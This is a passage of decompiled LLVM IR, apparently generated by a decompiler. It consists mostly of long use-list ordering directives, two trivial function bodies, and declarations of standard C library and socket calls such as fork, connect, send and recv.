759, 760, 761, 762, 763, 764, 765, 437, 438, 394, 439, 624, 623, 622, 621, 620, 619, 767, 768, 626, 625, 779, 780, 627, 947, 633, 632, 631, 630, 629, 628, 949, 440, 634, 407, 441, 950, 442, 951, 640, 639, 638, 637, 636, 635, 382, 952, 953, 954, 443, 334, 955, 956, 957, 444, 958, 643, 642, 641, 455, 964, 965, 644, 456, 648, 647, 646, 645, 967, 968, 445, 978, 979, 384, 980, 650, 649, 395, 3, 654, 653, 652, 651, 361, 969, 970, 971, 360, 972, 976, 977, 446, 655, 447, 973, 974, 975, 656, 169, 981, 982, 983, 657, 984, 985, 988, 989, 990, 660, 659, 658, 22, 991, 992, 661, 176, 177, 178, 662, 663, 664, 665, 322, 321, 320 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @call___do_global_ctors_aux() local_unnamed_addr {
entry:
  %v5_11e1c = load i32, i32* @r0, align 4
  ret i32 %v5_11e1c

; uselistorder directives
  uselistorder i32* @r0, { 8, 9, 10, 99, 11, 100, 12, 48, 49, 50, 51, 13, 101, 102, 52, 53, 54, 28, 103, 104, 105, 106, 55, 56, 57, 32, 107, 14, 58, 59, 60, 3, 15, 61, 62, 4, 6, 0, 1, 63, 64, 5, 65, 66, 67, 16, 68, 69, 70, 2, 71, 72, 73, 110, 108, 109, 17, 74, 75, 111, 112, 7, 114, 115, 116, 117, 118, 119, 18, 120, 121, 122, 123, 124, 113, 76, 77, 78, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 89, 90, 91, 92, 20, 22, 173, 174, 175, 176, 177, 44, 45, 46, 47, 23, 24, 25, 26, 42, 178, 179, 93, 27, 158, 159, 160, 161, 162, 163, 79, 80, 81, 82, 83, 84, 85, 29, 30, 168, 31, 167, 164, 165, 166, 19, 21, 180, 33, 34, 171, 35, 170, 37, 36, 86, 87, 88, 94, 95, 96, 97, 98, 169, 172, 38, 39, 40, 41, 43 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_11e24 = load i32, i32* @r4, align 4
  %v0_11e2c = call i32 @__do_global_dtors_aux()
  call void @__pseudo_branch(i32 %v3_11e24)
  ret i32 %v0_11e2c

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 1, 11, 5, 6, 3, 4, 7, 8, 16, 17, 13, 14, 15, 0, 18, 10, 9, 2, 12 }
  uselistorder i32 0, { 0, 694, 102, 695, 696, 189, 188, 393, 87, 88, 89, 90, 395, 394, 41, 40, 103, 697, 698, 699, 700, 702, 701, 1, 703, 704, 705, 706, 91, 707, 132, 708, 709, 710, 711, 712, 713, 714, 133, 396, 399, 397, 398, 715, 716, 717, 718, 719, 720, 421, 422, 228, 423, 424, 425, 26, 426, 427, 104, 428, 429, 430, 134, 431, 432, 433, 434, 435, 436, 721, 2, 400, 437, 42, 105, 438, 439, 193, 3, 401, 195, 440, 43, 106, 441, 442, 194, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 135, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 27, 474, 475, 476, 477, 478, 479, 480, 107, 78, 481, 482, 136, 137, 483, 484, 485, 486, 138, 487, 488, 489, 490, 491, 492, 493, 494, 495, 28, 496, 497, 498, 499, 500, 501, 502, 224, 503, 44, 139, 504, 140, 261, 505, 506, 507, 508, 509, 510, 29, 511, 512, 513, 514, 515, 516, 517, 262, 518, 519, 520, 521, 141, 522, 523, 524, 30, 525, 100, 526, 527, 528, 529, 530, 531, 532, 533, 4, 534, 535, 536, 402, 537, 538, 539, 540, 541, 542, 544, 543, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 142, 722, 723, 724, 725, 726, 555, 556, 557, 558, 559, 727, 728, 729, 5, 730, 731, 560, 196, 561, 562, 108, 563, 732, 45, 70, 733, 734, 735, 736, 737, 738, 747, 748, 739, 740, 741, 742, 743, 744, 745, 746, 749, 143, 144, 564, 565, 146, 566, 263, 145, 567, 71, 568, 569, 197, 6, 570, 147, 571, 572, 573, 574, 575, 750, 751, 752, 264, 265, 753, 754, 576, 577, 578, 579, 580, 109, 581, 582, 583, 584, 585, 148, 586, 588, 589, 587, 590, 110, 591, 592, 149, 593, 150, 225, 266, 594, 595, 151, 152, 596, 597, 598, 599, 600, 601, 235, 602, 603, 267, 604, 236, 606, 157, 608, 154, 155, 605, 153, 607, 609, 611, 112, 612, 613, 158, 61, 62, 614, 615, 111, 268, 616, 617, 159, 269, 618, 619, 156, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 270, 631, 92, 69, 630, 632, 633, 634, 7, 417, 160, 418, 99, 63, 76, 610, 198, 113, 755, 756, 8, 757, 199, 128, 635, 403, 960, 769, 271, 272, 760, 761, 161, 762, 763, 765, 764, 766, 767, 226, 768, 129, 130, 131, 770, 758, 759, 64, 65, 771, 773, 774, 772, 775, 776, 777, 778, 79, 779, 780, 80, 781, 81, 782, 82, 783, 164, 636, 162, 637, 638, 639, 163, 640, 72, 73, 641, 165, 642, 273, 31, 274, 643, 644, 227, 166, 275, 276, 645, 167, 784, 785, 786, 791, 168, 787, 200, 277, 792, 278, 46, 47, 48, 49, 114, 115, 169, 170, 793, 116, 794, 232, 231, 230, 961, 171, 9, 77, 50, 672, 795, 796, 673, 172, 797, 404, 798, 101, 117, 799, 800, 804, 801, 802, 803, 201, 805, 257, 807, 806, 202, 808, 809, 810, 646, 10, 204, 173, 648, 647, 203, 237, 811, 812, 813, 66, 814, 815, 174, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 175, 233, 837, 838, 839, 279, 840, 841, 842, 843, 844, 845, 846, 847, 51, 849, 848, 74, 850, 851, 280, 866, 852, 853, 854, 12, 11, 238, 222, 223, 229, 855, 856, 858, 859, 118, 190, 861, 281, 862, 863, 13, 864, 865, 867, 282, 239, 860, 857, 868, 869, 176, 870, 871, 14, 927, 928, 929, 930, 178, 177, 931, 179, 674, 675, 872, 873, 874, 964, 965, 966, 967, 970, 971, 972, 973, 974, 975, 976, 977, 968, 969, 978, 979, 980, 981, 982, 983, 984, 985, 32, 986, 987, 988, 989, 33, 990, 991, 34, 992, 993, 35, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1008, 1009, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 36, 1026, 1027, 1028, 1029, 37, 1030, 1031, 1032, 1033, 38, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 656, 956, 1046, 893, 894, 895, 896, 1047, 93, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 180, 1056, 85, 1057, 83, 84, 1058, 1059, 1060, 283, 284, 285, 1064, 286, 1072, 1074, 405, 205, 1075, 287, 1073, 288, 289, 15, 1061, 1062, 1063, 676, 677, 678, 679, 680, 681, 182, 119, 682, 683, 684, 86, 181, 685, 290, 649, 120, 650, 121, 651, 183, 877, 878, 879, 880, 16, 875, 876, 17, 652, 653, 406, 67, 654, 258, 655, 292, 1065, 293, 240, 1066, 1067, 1068, 1069, 291, 899, 901, 902, 52, 206, 903, 900, 897, 898, 18, 906, 904, 905, 207, 907, 908, 294, 19, 909, 184, 910, 911, 912, 913, 914, 915, 20, 21, 657, 658, 659, 660, 295, 881, 882, 925, 918, 919, 883, 884, 185, 885, 886, 887, 888, 889, 296, 890, 891, 932, 22, 788, 789, 790, 23, 1076, 1077, 75, 407, 933, 661, 957, 926, 662, 962, 958, 963, 916, 892, 663, 1070, 1071, 24, 953, 954, 192, 191, 408, 94, 95, 96, 97, 410, 409, 54, 53, 39, 68, 955, 411, 25, 934, 935, 98, 936, 937, 938, 939, 940, 186, 412, 415, 413, 414, 941, 416, 234, 301, 664, 302, 208, 55, 241, 297, 298, 299, 242, 300, 665, 303, 666, 304, 305, 667, 668, 669, 259, 670, 306, 671, 307, 122, 243, 308, 244, 187, 686, 687, 309, 688, 691, 310, 689, 311, 690, 209, 692, 693, 245, 313, 314, 312, 315, 317, 316, 318, 917, 246, 247, 248, 249, 920, 921, 321, 319, 320, 210, 922, 923, 924, 56, 327, 57, 326, 322, 325, 212, 328, 323, 324, 211, 329, 250, 123, 330, 331, 332, 333, 334, 952, 124, 58, 221, 213, 253, 254, 942, 943, 944, 214, 251, 252, 255, 945, 946, 256, 947, 948, 216, 59, 125, 126, 215, 950, 951, 260, 127, 60, 335, 949, 336, 217, 337, 338, 219, 218, 339, 220, 959, 419, 420, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092 }
  uselistorder i32* @r4, { 45, 473, 46, 47, 48, 49, 50, 51, 52, 53, 54, 235, 236, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 10, 73, 74, 75, 76, 11, 77, 78, 79, 12, 80, 81, 237, 238, 13, 239, 240, 241, 242, 243, 244, 14, 245, 246, 247, 248, 249, 250, 251, 82, 83, 84, 85, 8, 86, 0, 87, 88, 252, 253, 254, 255, 256, 257, 258, 259, 260, 89, 1, 261, 5, 262, 263, 4, 264, 265, 266, 16, 267, 15, 268, 269, 270, 90, 91, 92, 93, 94, 95, 96, 475, 476, 97, 98, 99, 100, 101, 102, 103, 271, 272, 273, 274, 275, 276, 277, 17, 278, 279, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 124, 123, 125, 126, 127, 128, 129, 130, 131, 18, 132, 133, 134, 140, 141, 142, 143, 2, 144, 145, 146, 147, 148, 149, 150, 19, 151, 20, 152, 153, 154, 155, 41, 42, 43, 135, 137, 136, 138, 139, 21, 280, 281, 282, 283, 284, 156, 157, 158, 159, 285, 288, 291, 292, 293, 294, 295, 286, 287, 289, 290, 22, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 311, 310, 312, 313, 314, 315, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 23, 25, 173, 24, 174, 177, 175, 176, 316, 317, 318, 319, 3, 320, 321, 322, 323, 324, 325, 326, 329, 327, 328, 36, 477, 478, 479, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 346, 347, 348, 349, 350, 26, 351, 352, 344, 345, 178, 39, 179, 180, 181, 182, 183, 184, 185, 186, 37, 187, 480, 481, 482, 483, 353, 354, 355, 356, 357, 358, 359, 27, 360, 28, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 29, 30, 374, 375, 376, 486, 489, 490, 378, 377, 380, 379, 7, 382, 381, 383, 6, 384, 385, 386, 387, 388, 389, 31, 390, 391, 392, 393, 394, 395, 396, 397, 398, 459, 460, 461, 223, 224, 225, 226, 227, 228, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 201, 202, 464, 507, 9, 426, 427, 508, 509, 510, 511, 512, 513, 514, 515, 32, 516, 517, 518, 519, 531, 532, 533, 534, 40, 535, 38, 526, 527, 528, 529, 530, 520, 521, 522, 523, 524, 229, 230, 188, 189, 190, 191, 192, 193, 194, 195, 196, 399, 402, 403, 404, 405, 400, 401, 198, 406, 407, 408, 197, 199, 200, 525, 428, 429, 430, 431, 33, 34, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 203, 204, 205, 206, 207, 208, 409, 410, 411, 412, 455, 456, 451, 452, 453, 454, 413, 414, 415, 416, 417, 35, 418, 419, 420, 421, 422, 423, 462, 463, 209, 210, 465, 466, 457, 458, 211, 212, 484, 485, 467, 468, 487, 488, 445, 446, 424, 425, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 231, 232, 233, 234, 447, 448, 449, 450, 469, 470, 471, 472, 44, 474 }
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8** @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare float @fabsf(float)

attributes #0 = { noreturn }
